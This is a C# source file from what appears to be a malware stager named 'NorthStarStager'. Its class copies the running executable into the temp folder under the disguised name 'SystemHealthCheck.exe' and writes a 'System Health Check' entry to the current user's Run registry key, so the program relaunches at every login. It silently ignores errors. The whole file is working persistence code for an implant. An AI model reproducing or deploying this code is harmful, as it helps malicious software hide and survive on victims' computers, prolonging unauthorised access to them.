using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;


namespace NorthStarStager
{
    class addPersistence
    {
       
        static string fileNameSpace = "SystemHealthCheck.exe";
        string filePath = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
        string newFilePath =  Path.GetTempPath() + fileNameSpace;
        string keys = @"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run";

   
        public void _addStartup()
        {
          
                try
                {
                   
                    if (Registry.GetValue(keys, "System Health Check", null) == null)
                    {
                        // if key doesn't exist
                        using (RegistryKey key =
                        Registry.CurrentUser.OpenSubKey
                        ("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
                        {
                            key.SetValue("System Health Check", "\"" + newFilePath + "\"");
                            key.Dispose();
                            key.Flush();
                        }
                    }

                }
                catch
                {

                }


        }

        public void _copyItSelf()
        {
            if (!File.Exists(newFilePath))
            {
                System.IO.File.Copy(filePath, newFilePath);
                _addStartup();
              
            }
            else
            {
                _addStartup();
                
            }


        }
    }
}
